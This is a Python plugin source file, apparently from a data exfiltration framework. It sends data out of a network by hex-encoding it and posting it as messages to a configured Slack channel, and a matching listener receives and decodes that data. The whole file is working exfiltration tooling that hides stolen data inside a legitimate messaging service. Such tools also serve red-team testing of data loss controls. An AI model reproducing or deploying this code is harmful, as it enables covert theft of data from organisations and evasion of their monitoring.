from slackclient import SlackClient
import time

app_exfiltrate = None
config = None
sc = None


def send(data):
    global sc
    chan = config['chan_id']
    app_exfiltrate.log_message('info', "[slack] Sending {} bytes with Slack".format(len(data)))
    data = data.encode('hex')

    sc.api_call("api.text")
    sc.api_call("chat.postMessage", as_user="true:", channel=chan, text=data)


def listen():
    app_exfiltrate.log_message('info', "[slack] Listening for messages")
    if sc.rtm_connect():
        while True:
            try:
                raw_data = sc.rtm_read()[0]
                if 'text' in raw_data:
                    app_exfiltrate.log_message('info', "[slack] Receiving {} bytes with Slack".format(len(raw_data['text'])))
                    app_exfiltrate.retrieve_data(raw_data['text'].decode('hex'))
            except:
                pass
            time.sleep(1)
    else:
        app_exfiltrate.log_message('warning', "Connection Failed, invalid token?")

def proxy():
    app_exfiltrate.log_message('info', "[proxy] [slack] proxy mode unavailable (useless) for Slack plugin")

class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config, sc
        sc = SlackClient(conf['api_token'])
        config = conf
        app.register_plugin('slack', {'send': send, 'listen': listen, 'proxy': proxy})
        app_exfiltrate = app
